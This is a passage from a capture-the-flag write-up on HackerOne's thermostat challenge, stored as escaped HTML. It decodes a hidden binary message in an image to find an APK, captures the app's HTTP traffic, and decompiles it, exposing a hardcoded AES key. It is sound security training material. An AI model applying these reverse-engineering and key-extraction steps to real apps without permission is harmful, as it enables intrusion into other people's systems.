manually.\u003c/p\u003e\n\n\u003cp\u003eThe script (\u003ca href=\"/redirect?url=https%3A%2F%2Fgist.github.com%2Fajxchapman%2Fb7baca094e61ff120c44379029646b97%23file-image_extract-py\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eavailable here\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e) went through each line in the image, annotated the identified characters and attempted to determine if a given character was a \u003ccode\u003e1\u003c/code\u003e or a \u003ccode\u003e0\u003c/code\u003e based on the character width (a non-fixed width font was used in the image which helped).\u003c/p\u003e\n\n\u003cp\u003eA copy of the annotated image can be seen below:\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"image_annotated.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/682/0ecf0ba78d777448026875d0a7e5836dd867128b/image_annotated.png?response-content-disposition=attachment%3B%20filename%3D%22image_annotated.png%22%3B%20filename%2A%3DUTF-8%27%27image_annotated.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061201Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026amp;X-Amz-Signature=7247193705a0fc39f17b12ac4672e2fd66f10711ab9c5ce0f2685596d4a310d7\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/682/0ecf0ba78d777448026875d0a7e5836dd867128b/image_annotated.png?response-content-disposition=attachment%3B%20filename%3D%22image_annotated.png%22%3B%20filename%2A%3DUTF-8%27%27image_annotated.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061201Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026amp;X-Amz-Signature=7247193705a0fc39f17b12ac4672e2fd66f10711ab9c5ce0f2685596d4a310d7\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThe output was somewhat tricky, as the character extraction was not 100% reliable due to image composition and noise, and no single line included the full output. With a little fiddling, however, the full binary code was easily extracted, and the message decoded:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eBinary String\n\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e011110100110110001101001011000100010101101111000100111000100101111001010001011001101000101001011110010011101011111001111001100000010110011001001010010000010110111001010000001010000000000100101110100100000010100101001\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eDecoded into bytes\n\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e\u0026#39;zlib+xK,K0,H-\\x05\\x00%\\x05)\u0026#39;\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eZlib decompressed\n\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=http%3A%2F%2Fbit.do%2Fh1therm\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ebit.do/h1therm\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003cli\u003eUn-shortened URL\n\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fdrive.google.com%2Ffile%2Fd%2F1u5Mg1xKJMrW4DMGaWtBZ1TJKPdvqCWdJ%2Fview\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://drive.google.com/file/d/1u5Mg1xKJMrW4DMGaWtBZ1TJKPdvqCWdJ/view\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eThis provided an Android APK file for download and allowed me to start on the next stage.\u003c/p\u003e\n\n\u003ch4 id=\"tools\"\u003eTools\u003c/h4\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fgist.github.com%2Fajxchapman%2Fb7baca094e61ff120c44379029646b97%23file-image_extract-py\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eimage_extract.py\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch3 id=\"summary-of-issues\"\u003eSummary of Issues:\u003c/h3\u003e\n\n\u003cul\u003e\n\u003cli\u003eStoring sensitive information in plain sight ;-)\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"stage-2-android-apk\"\u003eStage 2 - Android APK\u003c/h2\u003e\n\n\u003cp\u003eWithout a spare test Android device to hand I downloaded and ran \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.android-x86.org%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eAndroid x86\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e in a VirtualBox Virtual Machine. Running the \u003ccode\u003eh1thermostat\u003c/code\u003e application downloaded from the previous stage I was greeted with a login screen:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"android_x86.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/681/db796ab88d1535900c5dd5c97649273e943d8756/android_x86.png?response-content-disposition=attachment%3B%20filename%3D%22android_x86.png%22%3B%20filename%2A%3DUTF-8%27%27android_x86.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061201Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026amp;X-Amz-Signature=d96e14a762a3ee50fd3bb9d38c407e0f84b1e60988a31572932b284232448d18\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/439/681/db796ab88d1535900c5dd5c97649273e943d8756/android_x86.png?response-content-disposition=attachment%3B%20filename%3D%22android_x86.png%22%3B%20filename%2A%3DUTF-8%27%27android_x86.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQYCKXWVJV%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T061201Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDA49PdtQjNwsmxuqXkUfx4reZ7FOIjOQweezWE1XNVvgIhAIx4Xhhh4XlvyIhDJdSEbmB96vDM5LCgXwGSfRM7F1iGKrQDCFUQARoMMDEzNjE5Mjc0ODQ5Igyn15lTDq2bI47AdVUqkQNMLcSRNdoLgSjMqfZWfS2MON26yye1i89YSblnHhNnmmD%2BCvb9yhqbaahpmKHBn3USgduRumLTV9NLIU7btFJI3aDtP%2FlWAUoPbX2QxPMxkJvic1ajY8aoF%2BnP%2Fk5UKukHF6D5Is0Fl3Ml%2BqRxmX1yWQTr3H8jccJZ6aCDwhBSY3iZbIjaXYPaWMislYIuYKKUaLL%2F%2FYtKvtqaU%2FJGIKdF0f6x2tCHDbPS827MCNRm0untsD%2FJzgKRNU1mRAA87%2BCkBpJKyJTehTat9%2F%2FN1nYNPFuZPiPZaAFHHLfjwSlmUUMt%2FjoBjH%2Fcyea8UZK0pA5Axz%2Fm0f%2B7vbWepdX7D%2BvGEghnkHR0Oe7JTNRrWnUe20hFtN2VX6fIFqm9o3ZNb5%2BD8rX67vlWEUKhs5kSGlyl9lGQ8eFTM41lWO%2F5Cj6DFNQF7PQ4bl85VypcyQ6hS%2FKzmgaXGJwEUyiknMXmQ%2BRjTRRFvw0kG2TaqDSXcr%2FcdXxN5FVFJsxMfo%2BqrTaGgGf8R88RwwIpSqqo0RKqA2Xh0TCcz6r%2FBTrqAUDBHv70zc1wQG84KmYipl4mNsyVGxUMZh3CsgQjwXY%2Fv6h62iMoRu%2F5MESZoXSTR0hNz9M95%2Fn2q%2BB8n8cjdZLS9WuYTCTYcrPyBfvG6lGVHQJ%2FCFMt0nOaRJepHaeOrZ8ixXpq%2FKU9YvFEk83zuOnTYxYm5hwxl37Sww%2FXZJHw2r23uHUmo8TMaZnWQj29AdMGqkOeoWqYjNS4Q3K3et0tfgVM4UMSCi28eH0lBYtC56QeRUk3j%2Brsw4LY0o%2FlP7RXyGFceiJ7fG0HRIst91IOe7KULe4yg3%2FgRBW2zW4bXrpvrkp3CnURtw%3D%3D\u0026amp;X-Amz-Signature=d96e14a762a3ee50fd3bb9d38c407e0f84b1e60988a31572932b284232448d18\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eAnalysis of the network traffic from the VM using \u003ca href=\"/redirect?url=https%3A%2F%2Fwww.wireshark.org%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eWireshark\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e showed the \u003ccode\u003eh1thermostat\u003c/code\u003e application sends unencrypted HTTP requests to a server at \u003ccode\u003e35.243.186.41\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003ePOST\u003c/span\u003e \u003cspan class=\"nn\"\u003e/\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Type\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eapplication/x-www-form-urlencoded; charset=UTF-8\u003c/span\u003e\n\u003cspan class=\"na\"\u003eUser-Agent\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eDalvik/2.1.0 (Linux; U; Android 8.1.0; VirtualBox Build/OPM8.190105.002)\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e35.243.186.41\u003c/span\u003e\n\u003cspan class=\"na\"\u003eConnection\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003eKeep-Alive\u003c/span\u003e\n\u003cspan class=\"na\"\u003eAccept-Encoding\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003egzip\u003c/span\u003e\n\u003cspan class=\"na\"\u003eContent-Length\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e123\u003c/span\u003e\n\nd=aKe2ZHj8oYjIqvbWwXi01599IT979iLWxWp6e7LhCqYZUBGSSLBZz6kkEzuElZViz270iXUjPuGg%0At%2F803RyZmSHaMd0KzZPTD%2FdgQlUgoNA%3D%0A\u0026amp;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhilst the application did not use TLS to encrypt the entire HTTP session, it appeared that the POST payload was in an encrypted form. In order to decrypt the payload I would have to review the application code.\u003c/p\u003e\n\n\u003cp\u003eBreaking out \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FiBotPeaches%2FApktool\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eapktool\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fpxb1988%2Fdex2jar\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003edex2jar\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fjava-decompiler%2Fjd-gui\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eJD-Gui\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e to extract the apk, disassemble the Dalvik executable to Java bytecode and decompile the Java bytecode to readable Java, I was able to get a good view of the application source code.\u003c/p\u003e\n\n\u003cp\u003eA review of the decompiled source code identified the encryption / decryption functions in \u003ccode\u003ecom.hackerone.thermostat.PayloadRequest\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003eprivate\u003c/span\u003e \u003cspan class=\"nc\"\u003eString\u003c/span\u003e \u003cspan class=\"nf\"\u003ebuildPayload\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eJSONObject\u003c/span\u003e \u003cspan class=\"n\"\u003eparamJSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003ethrows\u003c/span\u003e \u003cspan class=\"nc\"\u003eException\u003c/span\u003e\n  \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003eSecretKeySpec\u003c/span\u003e \u003cspan class=\"n\"\u003elocalSecretKeySpec\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eSecretKeySpec\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e \u003cspan class=\"mi\"\u003e56\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e79\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e46\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e106\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e26\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e27\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e34\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e59\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e128\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e23\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e96\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e96\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"mi\"\u003e90\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e80\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e116\u003c/span\u003e \u003cspan class=\"o\"\u003e},\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;AES\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"n\"\u003earrayOfByte\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e];\u003c/span\u003e\n    \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nf\"\u003eSecureRandom\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003enextBytes\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003earrayOfByte\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003eObject\u003c/span\u003e \u003cspan class=\"n\"\u003elocalObject\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eIvParameterSpec\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003earrayOfByte\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003eCipher\u003c/span\u003e \u003cspan class=\"n\"\u003elocalCipher\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nc\"\u003eCipher\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetInstance\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;AES/CBC/PKCS5Padding\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003elocalCipher\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003einit\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003elocalSecretKeySpec\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eAlgorithmParameterSpec\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"n\"\u003elocalObject\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003elocalObject\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003elocalCipher\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003edoFinal\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eparamJSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003etoString\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003egetBytes\u003c/span\u003e\u003cspan class=\"o\"\u003e());\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eparamJSONObject\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003elocalObject\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e];\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003earraycopy\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003earrayOfByte\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eparamJSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"nc\"\u003eSystem\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003earraycopy\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003elocalObject\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eparamJSONObject\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e16\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan 